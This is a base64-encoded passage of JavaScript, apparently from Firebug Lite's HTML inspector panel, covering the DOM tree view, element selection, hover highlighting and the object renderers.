wYXJlbnROb2RlOw0KDQogICAgICAgICAgICBpZiAobm9kZSkNCiAgICAgICAgICAgICAgICBpZCA9IEVsZW1lbnRDYWNoZShub2RlKTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgc3RhY2sucHVzaChpZCk7DQogICAgICAgIA0KICAgICAgICB3aGlsZShzdGFjay5sZW5ndGggPiAwKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZCA9IHN0YWNrLnBvcCgpOw0KICAgICAgICAgICAgbm9kZSA9ICQoaWQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoc3RhY2subGVuZ3RoID4gMCAmJiBFbGVtZW50Q2FjaGUuZ2V0KGlkKS5jaGlsZE5vZGVzLmxlbmd0aCA+IDApDQogICAgICAgICAgICAgIHRoaXMuYXBwZW5kVHJlZUNoaWxkcmVuKG5vZGUpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBzZWxlY3RFbGVtZW50KG5vZGUpOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8NCiAgICAgICAgaWYgKGZiUGFuZWwxKQ0KICAgICAgICAgICAgZmJQYW5lbDEuc2Nyb2xsVG9wID0gTWF0aC5yb3VuZChub2RlLm9mZnNldFRvcCAtIGZiUGFuZWwxLmNsaWVudEhlaWdodC8yKTsNCiAgICB9DQogICAgDQp9KTsNCg0KRmlyZWJ1Zy5yZWdpc3Rlck1vZHVsZShGaXJlYnVnLkhUTUwpOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIEhUTUwgUGFuZWwNCg0KZnVuY3Rpb24gSFRNTFBhbmVsKCl7fTsNCg0KSFRNTFBhbmVsLnByb3RvdHlwZSA9IGV4dGVuZChGaXJlYnVnLlBhbmVsLA0Kew0KICAgIG5hbWU6ICJIVE1MIiwNCiAgICB0aXRsZTogIkhUTUwiLA0KICAgIA0KICAgIG9wdGlvbnM6IHsNCiAgICAgICAgaGFzU2lkZVBhbmVsOiB0cnVlLA0KICAgICAgICAvL2hhc1Rvb2xCdXR0b25zOiB0cnVlLA0KICAgICAgICBpc1ByZVJlbmRlcmVkOiAhRmlyZWJ1Zy5mbGV4Q2hyb21lRW5hYmxlZCAvKiBGSVhNRSB4eHhwZWRybyBjaHJvbWVuZXcgKi8sDQogICAgICAgIGlubmVySFRNTFN5bmM6IHRydWUNCiAgICB9LA0KDQogICAgY3JlYXRlOiBmdW5jdGlvbigpew0KICAgICAgICBGaXJlYnVnLlBhbmVsLmNyZWF0ZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgICAgICANCiAgICAgICAgdGhpcy5wYW5lbE5vZGUuc3R5bGUucGFkZGluZyA9ICI0cHggM3B4IDFweCAxNXB4IjsNCiAgICAgICAgdGhpcy5wYW5lbE5vZGUuc3R5bGUubWluV2lkdGggPSAiNTAwcHgiOw0KICAgICAgICANCiAgICAgICAgaWYgKEVudi5PcHRpb25zLmVuYWJsZVBlcnNpc3RlbnQgfHwgRmlyZWJ1Zy5jaHJvbWUudHlwZSAhPSAicG9wdXAiKQ0KICAgICAgICAgICAgdGhpcy5jcmVhdGVVSSgpOw0KICAgICAgICANCiAgICAgICAgaWYodGhpcy5zaWRlUGFuZWxCYXIgJiYgIXRoaXMuc2lkZVBhbmVsQmFyLnNlbGVjdGVkUGFuZWwpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMuc2lkZVBhbmVsQmFyLnNlbGVjdFBhbmVsKCJjc3MiKTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgZGVzdHJveTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgc2VsZWN0ZWRFbGVtZW50ID0gbnVsbDsNCiAgICAgICAgZmJQYW5lbDEgPSBudWxsOw0KICAgICAgICANCiAgICAgICAgc2VsZWN0ZWRTaWRlUGFuZWxUUyA9IG51bGw7DQogICAgICAgIHNlbGVjdGVkU2lkZVBhbmVsVGltZXIgPSBudWxsOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5QYW5lbC5kZXN0cm95LmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQogICAgfSwNCiAgICANCiAgICBjcmVhdGVVSTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHJvb3ROb2RlID0gRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudDsNCiAgICAgICAgdmFyIGh0bWwgPSBbXTsNCiAgICAgICAgRmlyZWJ1Zy5IVE1MLmFwcGVuZFRyZWVOb2RlKHJvb3ROb2RlLCBodG1sKTsNCiAgICAgICAgDQogICAgICAgIHRoaXMucGFuZWxOb2RlLmlubmVySFRNTCA9IGh0bWwuam9pbigiIik7DQogICAgfSwNCiAgICANCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnLlBhbmVsLmluaXRpYWxpemUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgYWRkRXZlbnQodGhpcy5wYW5lbE5vZGUsICdjbGljaycsIEZpcmVidWcuSFRNTC5vblRyZWVDbGljayk7DQogICAgICAgIA0KICAgICAgICBmYlBhbmVsMSA9ICQoImZiUGFuZWwxIik7DQogICAgICAgIA0KICAgICAgICBpZighc2VsZWN0ZWRFbGVtZW50KQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuc2VsZWN0ZWRIVE1MRWxlbWVudElkID0NCiAgICAgICAgICAgICAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuc2VsZWN0ZWRIVE1MRWxlbWVudElkICYmDQogICAgICAgICAgICAgICAgRWxlbWVudENhY2hlLmdldChGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuc2VsZWN0ZWRIVE1MRWxlbWVudElkKSA/DQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLnNlbGVjdGVkSFRNTEVsZW1lbnRJZCA6DQogICAgICAgICAgICAgICAgRWxlbWVudENhY2hlKEZpcmVidWcuYnJvd3Nlci5kb2N1bWVudC5ib2R5KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgRmlyZWJ1Zy5IVE1MLnNlbGVjdFRyZWVOb2RlKEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5zZWxlY3RlZEhUTUxFbGVtZW50SWQpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybw0KICAgICAgICBhZGRFdmVudChmYlBhbmVsMSwgJ21vdXNlbW92ZScsIEZpcmVidWcuSFRNTC5vbkxpc3RNb3VzZU1vdmUpOw0KICAgICAgICBhZGRFdmVudCgkKCJmYkNvbnRlbnQiKSwgJ21vdXNlb3V0JywgRmlyZWJ1Zy5IVE1MLm9uTGlzdE1vdXNlTW92ZSk7DQogICAgICAgIGFkZEV2ZW50KEZpcmVidWcuY2hyb21lLm5vZGUsICdtb3VzZW91dCcsIEZpcmVidWcuSFRNTC5vbkxpc3RNb3VzZU1vdmUpOyAgICAgICAgDQogICAgfSwNCiAgICANCiAgICBzaHV0ZG93bjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8NCiAgICAgICAgcmVtb3ZlRXZlbnQoZmJQYW5lbDEsICdtb3VzZW1vdmUnLCBGaXJlYnVnLkhUTUwub25MaXN0TW91c2VNb3ZlKTsNCiAgICAgICAgcmVtb3ZlRXZlbnQoJCgiZmJDb250ZW50IiksICdtb3VzZW91dCcsIEZpcmVidWcuSFRNTC5vbkxpc3RNb3VzZU1vdmUpOw0KICAgICAgICByZW1vdmVFdmVudChGaXJlYnVnLmNocm9tZS5ub2RlLCAnbW91c2VvdXQnLCBGaXJlYnVnLkhUTUwub25MaXN0TW91c2VNb3ZlKTsNCiAgICAgICAgDQogICAgICAgIHJlbW92ZUV2ZW50KHRoaXMucGFuZWxOb2RlLCAnY2xpY2snLCBGaXJlYnVnLkhUTUwub25UcmVlQ2xpY2spOw0KICAgICAgICANCiAgICAgICAgZmJQYW5lbDEgPSBudWxsOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5QYW5lbC5zaHV0ZG93bi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0sDQogICAgDQogICAgcmVhdHRhY2g6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIC8vIFRPRE86IHBhbmVsIHJlYXR0YWNoDQogICAgICAgIGlmKEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5zZWxlY3RlZEhUTUxFbGVtZW50SWQpDQogICAgICAgICAgICBGaXJlYnVnLkhUTUwuc2VsZWN0VHJlZU5vZGUoRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLnNlbGVjdGVkSFRNTEVsZW1lbnRJZCk7DQogICAgfSwNCiAgICANCiAgICB1cGRhdGVTZWxlY3Rpb246IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIHZhciBpZCA9IEVsZW1lbnRDYWNoZShvYmplY3QpOw0KICAgICAgICANCiAgICAgICAgaWYgKGlkKQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLkhUTUwuc2VsZWN0VHJlZU5vZGUoaWQpOw0KICAgICAgICB9DQogICAgfQ0KfSk7DQoNCkZpcmVidWcucmVnaXN0ZXJQYW5lbChIVE1MUGFuZWwpOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdmFyIGZvcm1hdFN0eWxlcyA9IGZ1bmN0aW9uKHN0eWxlcykNCnsNCiAgICByZXR1cm4gaXNJRSA/DQogICAgICAgIC8vIElFIHJldHVybiBDU1MgcHJvcGVydHkgbmFtZXMgaW4gdXBwZXIgY2FzZSwgc28gd2UgbmVlZCB0byBjb252ZXJ0IHRoZW0NCiAgICAgICAgc3R5bGVzLnJlcGxhY2UoLyhbXlxzXSspXHMqOi9nLCBmdW5jdGlvbihtLGcpe3JldHVybiBnLnRvTG93ZXJDYXNlKCkrIjoiO30pIDoNCiAgICAgICAgLy8gb3RoZXIgYnJvd3NlcnMgYXJlIGp1c3QgZmluZQ0KICAgICAgICBzdHlsZXM7DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdmFyIHNlbGVjdGVkRWxlbWVudCA9IG51bGw7DQp2YXIgZmJQYW5lbDEgPSBudWxsOw0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAgDQp2YXIgc2VsZWN0ZWRTaWRlUGFuZWxUUywgc2VsZWN0ZWRTaWRlUGFuZWxUaW1lcjsNCg0KdmFyIHNlbGVjdEVsZW1lbnQ9IGZ1bmN0aW9uIHNlbGVjdEVsZW1lbnQoZSkNCnsNCiAgICBpZiAoZSAhPSBzZWxlY3RlZEVsZW1lbnQpDQogICAgew0KICAgICAgICBpZiAoc2VsZWN0ZWRFbGVtZW50KQ0KICAgICAgICAgICAgc2VsZWN0ZWRFbGVtZW50LmNsYXNzTmFtZSA9ICJvYmplY3RCb3gtZWxlbWVudCI7DQogICAgICAgICAgICANCiAgICAgICAgZS5jbGFzc05hbWUgPSBlLmNsYXNzTmFtZSArICIgc2VsZWN0ZWRFbGVtZW50IjsNCg0KICAgICAgICBpZiAoRkJMLmlzRmlyZWZveCkNCiAgICAgICAgICAgIGUuc3R5bGUuTW96Qm9yZGVyUmFkaXVzID0gIjJweCI7DQogICAgICAgIA0KICAgICAgICBlbHNlIGlmIChGQkwuaXNTYWZhcmkpDQogICAgICAgICAgICBlLnN0eWxlLldlYmtpdEJvcmRlclJhZGl1cyA9ICIycHgiOw0KICAgICAgICANCiAgICAgICAgZS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMnB4IjsNCg0KICAgICAgICBzZWxlY3RlZEVsZW1lbnQgPSBlOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLnNlbGVjdGVkSFRNTEVsZW1lbnRJZCA9IGUuaWQ7DQogICAgICAgIA0KICAgICAgICB2YXIgdGFyZ2V0ID0gRWxlbWVudENhY2hlLmdldChlLmlkKTsNCiAgICAgICAgdmFyIHNpZGVQYW5lbEJhciA9IEZpcmVidWcuY2hyb21lLmdldFBhbmVsKCJIVE1MIikuc2lkZVBhbmVsQmFyOw0KICAgICAgICB2YXIgc2VsZWN0ZWRTaWRlUGFuZWwgPSBzaWRlUGFuZWxCYXIgPyBzaWRlUGFuZWxCYXIuc2VsZWN0ZWRQYW5lbCA6IG51bGw7DQogICAgICAgIA0KICAgICAgICB2YXIgc3RhY2sgPSBGaXJlYnVnQ2hyb21lLmh0bWxTZWxlY3Rpb25TdGFjazsNCiAgICAgICAgDQogICAgICAgIHN0YWNrLnVuc2hpZnQodGFyZ2V0KTsNCiAgICAgICAgDQogICAgICAgIGlmIChzdGFjay5sZW5ndGggPiAyKQ0KICAgICAgICAgICAgc3RhY2sucG9wKCk7DQogICAgICAgIA0KICAgICAgICB2YXIgbGF6eVNlbGVjdCA9IGZ1bmN0aW9uKCkNCiAgICAgICAgew0KICAgICAgICAgICAgc2VsZWN0ZWRTaWRlUGFuZWxUUyA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoc2VsZWN0ZWRTaWRlUGFuZWwpDQogICAgICAgICAgICAgICAgc2VsZWN0ZWRTaWRlUGFuZWwuc2VsZWN0KHRhcmdldCwgdHJ1ZSk7DQogICAgICAgIH07DQogICAgICAgIA0KICAgICAgICBpZiAoc2VsZWN0ZWRTaWRlUGFuZWxUaW1lcikNCiAgICAgICAgew0KICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHNlbGVjdGVkU2lkZVBhbmVsVGltZXIpOw0KICAgICAgICAgICAgc2VsZWN0ZWRTaWRlUGFuZWxUaW1lciA9IG51bGw7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmIChuZXcgRGF0ZSgpLmdldFRpbWUoKSAtIHNlbGVjdGVkU2lkZVBhbmVsVFMgPiAxMDApDQogICAgICAgICAgICBzZXRUaW1lb3V0KGxhenlTZWxlY3QsIDApOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICBzZWxlY3RlZFNpZGVQYW5lbFRpbWVyID0gc2V0VGltZW91dChsYXp5U2VsZWN0LCAxNTApOw0KICAgIH0NCn07DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyAqKiogIFRPRE86ICBSRUZBQ1RPUiAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KRmlyZWJ1Zy5IVE1MLm9uVHJlZUNsaWNrID0gZnVuY3Rpb24gKGUpDQp7DQogICAgZSA9IGUgfHwgZXZlbnQ7DQogICAgdmFyIHRhcmc7DQogICAgDQogICAgaWYgKGUudGFyZ2V0KSB0YXJnID0gZS50YXJnZXQ7DQogICAgZWxzZSBpZiAoZS5zcmNFbGVtZW50KSB0YXJnID0gZS5zcmNFbGVtZW50Ow0KICAgIGlmICh0YXJnLm5vZGVUeXBlID09IDMpIC8vIGRlZmVhdCBTYWZhcmkgYnVnDQogICAgICAgIHRhcmcgPSB0YXJnLnBhcmVudE5vZGU7DQogICAgICAgIA0KICAgIA0KICAgIGlmICh0YXJnLmNsYXNzTmFtZS5pbmRleE9mKCdub2RlQ29udHJvbCcpICE9IC0xIHx8IHRhcmcuY2xhc3NOYW1lID09ICdub2RlVGFnJykNCiAgICB7DQogICAgICAgIC8vIEZJWE1FIHh4eHBlZHJvIHJlbW92ZSB0aGlzDQogICAgICAgIC8vdmFyIGlzSUUgPSBmYWxzZTsNCiAgICAgICAgDQogICAgICAgIGlmKHRhcmcuY2xhc3NOYW1lID09ICdub2RlVGFnJykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGNvbnRyb2wgPSBpc0lFID8gKHRhcmcucGFyZW50Tm9kZS5wcmV2aW91c1NpYmxpbmcgfHwgdGFyZykgOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAodGFyZy5wYXJlbnROb2RlLnByZXZpb3VzU2libGluZyB8fCB0YXJnKTsNCg0KICAgICAgICAgICAgc2VsZWN0RWxlbWVudCh0YXJnLnBhcmVudE5vZGUucGFyZW50Tm9kZSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChjb250cm9sLmNsYXNzTmFtZS5pbmRleE9mKCdub2RlQ29udHJvbCcpID09IC0xKQ0KICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICB9IGVsc2UNCiAgICAgICAgICAgIGNvbnRyb2wgPSB0YXJnOw0KICAgICAgICANCiAgICAgICAgRkJMLmNhbmNlbEV2ZW50KGUpOw0KICAgICAgICANCiAgICAgICAgdmFyIHRyZWVOb2RlID0gaXNJRSA/IGNvbnRyb2wubmV4dFNpYmxpbmcgOiBjb250cm9sLnBhcmVudE5vZGU7DQogICAgICAgIA0KICAgICAgICAvL0ZCTC5GaXJlYnVnLkNvbnNvbGUubG9nKHRyZWVOb2RlKTsNCiAgICAgICAgDQogICAgICAgIGlmIChjb250cm9sLmNsYXNzTmFtZS5pbmRleE9mKCcgbm9kZU1heGltaXplZCcpICE9IC0xKSB7DQogICAgICAgICAgICBGQkwuRmlyZWJ1Zy5IVE1MLnJlbW92ZVRyZWVDaGlsZHJlbih0cmVlTm9kZSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBGQkwuRmlyZWJ1Zy5IVE1MLmFwcGVuZFRyZWVDaGlsZHJlbih0cmVlTm9kZSk7DQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZSBpZiAodGFyZy5jbGFzc05hbWUgPT0gJ25vZGVWYWx1ZScgfHwgdGFyZy5jbGFzc05hbWUgPT0gJ25vZGVOYW1lJykNCiAgICB7DQogICAgICAgIC8qDQogICAgICAgIHZhciBpbnB1dCA9IEZCTC5GaXJlYnVnLmNocm9tZS5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndHJlZUlucHV0Jyk7DQogICAgICAgIA0KICAgICAgICBpbnB1dC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgaW5wdXQuc3R5bGUubGVmdCA9IHRhcmcub2Zmc2V0TGVmdCArICdweCc7DQogICAgICAgIGlucHV0LnN0eWxlLnRvcCA9IEZCTC50b3BIZWlnaHQgKyB0YXJnLm9mZnNldFRvcCAtIEZCTC5mYlBhbmVsMS5zY3JvbGxUb3AgKyAncHgnOw0KICAgICAgICBpbnB1dC5zdHlsZS53aWR0aCA9IHRhcmcub2Zmc2V0V2lkdGggKyA2ICsgJ3B4JzsNCiAgICAgICAgaW5wdXQudmFsdWUgPSB0YXJnLnRleHRDb250ZW50IHx8IHRhcmcuaW5uZXJUZXh0Ow0KICAgICAgICBpbnB1dC5mb2N1cygpOyANCiAgICAgICAgLyoqLw0KICAgIH0NCn07DQoNCmZ1bmN0aW9uIG9uTGlzdE1vdXNlT3V0KGUpDQp7DQogICAgZSA9IGUgfHwgZXZlbnQgfHwgd2luZG93Ow0KICAgIHZhciB0YXJnOw0KICAgIA0KICAgIGlmIChlLnRhcmdldCkgdGFyZyA9IGUudGFyZ2V0Ow0KICAgIGVsc2UgaWYgKGUuc3JjRWxlbWVudCkgdGFyZyA9IGUuc3JjRWxlbWVudDsNCiAgICBpZiAodGFyZy5ub2RlVHlwZSA9PSAzKSAvLyBkZWZlYXQgU2FmYXJpIGJ1Zw0KICAgICAgdGFyZyA9IHRhcmcucGFyZW50Tm9kZTsNCiAgICAgICAgDQogICAgICBpZiAoaGFzQ2xhc3ModGFyZywgImZiUGFuZWwiKSkgew0KICAgICAgICAgIEZCTC5GaXJlYnVnLkluc3BlY3Rvci5oaWRlQm94TW9kZWwoKTsNCiAgICAgICAgICBob3ZlckVsZW1lbnQgPSBudWxsOyAgICAgICAgDQogICAgICB9DQp9Ow0KICAgIA0KdmFyIGhvdmVyRWxlbWVudCA9IG51bGw7DQp2YXIgaG92ZXJFbGVtZW50VFMgPSAwOw0KDQpGaXJlYnVnLkhUTUwub25MaXN0TW91c2VNb3ZlID0gZnVuY3Rpb24gb25MaXN0TW91c2VNb3ZlKGUpDQp7DQogICAgdHJ5DQogICAgew0KICAgICAgICBlID0gZSB8fCBldmVudCB8fCB3aW5kb3c7DQogICAgICAgIHZhciB0YXJnOw0KICAgICAgICANCiAgICAgICAgaWYgKGUudGFyZ2V0KSB0YXJnID0gZS50YXJnZXQ7DQogICAgICAgIGVsc2UgaWYgKGUuc3JjRWxlbWVudCkgdGFyZyA9IGUuc3JjRWxlbWVudDsNCiAgICAgICAgaWYgKHRhcmcubm9kZVR5cGUgPT0gMykgLy8gZGVmZWF0IFNhZmFyaSBidWcNCiAgICAgICAgICAgIHRhcmcgPSB0YXJnLnBhcmVudE5vZGU7DQogICAgICAgICAgICANCiAgICAgICAgdmFyIGZvdW5kID0gZmFsc2U7DQogICAgICAgIHdoaWxlICh0YXJnICYmICFmb3VuZCkgew0KICAgICAgICAgICAgaWYgKCEvXHNub2RlQm94XHN8XHNvYmplY3RCb3gtc2VsZWN0b3Jccy8udGVzdCgiICIgKyB0YXJnLmNsYXNzTmFtZSArICIgIikpDQogICAgICAgICAgICAgICAgdGFyZyA9IHRhcmcucGFyZW50Tm9kZTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICBmb3VuZCA9IHRydWU7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmICghdGFyZykNCiAgICAgICAgew0KICAgICAgICAgICAgRkJMLkZpcmVidWcuSW5zcGVjdG9yLmhpZGVCb3hNb2RlbCgpOw0KICAgICAgICAgICAgaG92ZXJFbGVtZW50ID0gbnVsbDsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLyoNCiAgICAgICAgaWYgKHR5cGVvZiB0YXJnLmF0dHJpYnV0ZXNbY2FjaGVJRF0gPT0gJ3VuZGVmaW5lZCcpIHJldHVybjsNCiAgICAgICAgDQogICAgICAgIHZhciB1aWQgPSB0YXJnLmF0dHJpYnV0ZXNbY2FjaGVJRF07DQogICAgICAgIGlmICghdWlkKSByZXR1cm47DQogICAgICAgIC8qKi8NCiAgICAgICAgDQogICAgICAgIGlmICh0eXBlb2YgdGFyZy5hdHRyaWJ1dGVzW2NhY2hlSURdID09ICd1bmRlZmluZWQnKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICB2YXIgdWlkID0gdGFyZy5hdHRyaWJ1dGVzW2NhY2hlSURdOw0KICAgICAgICBpZiAoIXVpZCkgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgdmFyIGVsID0gRWxlbWVudENhY2hlLmdldCh1aWQudmFsdWUpOw0KICAgICAgICANCiAgICAgICAgdmFyIG5vZGVOYW1lID0gZWwubm9kZU5hbWUudG9Mb3dlckNhc2UoKTsNCiAgICANCiAgICAgICAgaWYgKEZCTC5pc0lFICYmICIgbWV0YSB0aXRsZSBzY3JpcHQgbGluayAiLmluZGV4T2YoIiAiK25vZGVOYW1lKyIgIikgIT0gLTEpDQogICAgICAgICAgICByZXR1cm47DQogICAgDQogICAgICAgIGlmICghL1xzbm9kZUJveFxzfFxzb2JqZWN0Qm94LXNlbGVjdG9yXHMvLnRlc3QoIiAiICsgdGFyZy5jbGFzc05hbWUgKyAiICIpKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICBpZiAoZWwuaWQgPT0gIkZpcmVidWdVSSIgfHwgIiBodG1sIGhlYWQgYm9keSBiciBzY3JpcHQgbGluayBpZnJhbWUgIi5pbmRleE9mKCIgIitub2RlTmFtZSsiICIpICE9IC0xKSB7IA0KICAgICAgICAgICAgRkJMLkZpcmVidWcuSW5zcGVjdG9yLmhpZGVCb3hNb2RlbCgpOw0KICAgICAgICAgICAgaG92ZXJFbGVtZW50ID0gbnVsbDsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgDQogICAgICAgIGlmICgobmV3IERhdGUoKS5nZXRUaW1lKCkgLSBob3ZlckVsZW1lbnRUUyA+IDQwKSAmJiBob3ZlckVsZW1lbnQgIT0gZWwpIHsNCiAgICAgICAgICAgIGhvdmVyRWxlbWVudFRTID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7DQogICAgICAgICAgICBob3ZlckVsZW1lbnQgPSBlbDsNCiAgICAgICAgICAgIEZCTC5GaXJlYnVnLkluc3BlY3Rvci5kcmF3Qm94TW9kZWwoZWwpOw0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoKEUpDQogICAgew0KICAgIH0NCn07DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCkZpcmVidWcuUmVwcyA9IHsNCg0KICAgIGFwcGVuZFRleHQ6IGZ1bmN0aW9uKG9iamVjdCwgaHRtbCkNCiAgICB7DQogICAgICAgIGh0bWwucHVzaChlc2NhcGVIVE1MKG9iamVjdFRvU3RyaW5nKG9iamVjdCkpKTsNCiAgICB9LA0KICAgIA0KICAgIGFwcGVuZE51bGw6IGZ1bmN0aW9uKG9iamVjdCwgaHRtbCkNCiAgICB7DQogICAgICAgIGh0bWwucHVzaCgnPHNwYW4gY2xhc3M9Im9iamVjdEJveC1udWxsIj4nLCBlc2NhcGVIVE1MKG9iamVjdFRvU3RyaW5nKG9iamVjdCkpLCAnPC9zcGFuPicpOw0KICAgIH0sDQogICAgDQogICAgYXBwZW5kU3RyaW5nOiBmdW5jdGlvbihvYmplY3QsIGh0bWwpDQogICAgew0KICAgICAgICBodG1sLnB1c2goJzxzcGFuIGNsYXNzPSJvYmplY3RCb3gtc3RyaW5nIj4mcXVvdDsnLCBlc2NhcGVIVE1MKG9iamVjdFRvU3RyaW5nKG9iamVjdCkpLA0KICAgICAgICAgICAgJyZxdW90Ozwvc3Bhbj4nKTsNCiAgICB9LA0KICAgIA0KICAgIGFwcGVuZEludGVnZXI6IGZ1bmN0aW9uKG9iamVjdCwgaHRtbCkNCiAgICB7DQogICAgICAgIGh0bWwucHVzaCgnPHNwYW4gY2xhc3M9Im9iamVjdEJveC1udW1iZXIiPicsIGVzY2FwZUhUTUwob2JqZWN0VG9TdHJpbmcob2JqZWN0KSksICc8L3NwYW4+Jyk7DQogICAgfSwNCiAgICANCiAgICBhcHBlbmRGbG9hdDogZnVuY3Rpb24ob2JqZWN0LCBodG1sKQ0KICAgIHsNCiAgICAgICAgaHRtbC5wdXNoKCc8c3BhbiBjbGFzcz0ib2JqZWN0Qm94LW51bWJlciI+JywgZXNjYXBlSFRNTChvYmplY3RUb1N0cmluZyhvYmplY3QpKSwgJzwvc3Bhbj4nKTsNCiAgICB9LA0KICAgIA0KICAgIGFwcGVuZEZ1bmN0aW9uOiBmdW5jdGlvbihvYmplY3QsIGh0bWwpDQogICAgew0KICAgICAgICB2YXIgcmVOYW1lID0gL2Z1bmN0aW9uID8oLio/KVwoLzsNCiAgICAgICAgdmFyIG0gPSByZU5hbWUuZXhlYyhvYmplY3RUb1N0cmluZyhvYmplY3QpKTsNCiAgICAgICAgdmFyIG5hbWUgPSBtICYmIG1bMV0gPyBtWzFdIDogImZ1bmN0aW9uIjsNCiAgICAgICAgaHRtbC5wdXNoKCc8c3BhbiBjbGFzcz0ib2JqZWN0Qm94LWZ1bmN0aW9uIj4nLCBlc2NhcGVIVE1MKG5hbWUpLCAnKCk8L3NwYW4+Jyk7DQogICAgfSwNCiAgICANCiAgICBhcHBlbmRPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgaHRtbCkNCiAgICB7DQogICAgICAgIC8qDQogICAgICAgIHZhciByZXAgPSBGaXJlYnVnLmdldFJlcChvYmplY3QpOw0KICAgICAgICB2YXIgb3V0cHV0cyA9IFtdOw0KICAgICAgICANCiAgICAgICAgcmVwLnRhZy50YWcuY29tcGlsZSgpOw0KICAgICAgICANCiAgICAgICAgdmFyIHN0ciA9IHJlcC50YWcucmVuZGVySFRNTCh7b2JqZWN0OiBvYmplY3R9LCBvdXRwdXRzKTsNCiAgICAgICAgaHRtbC5wdXNoKHN0cik7DQogICAgICAgIC8qKi8NCiAgICAgICAgDQogICAgICAgIHRyeQ0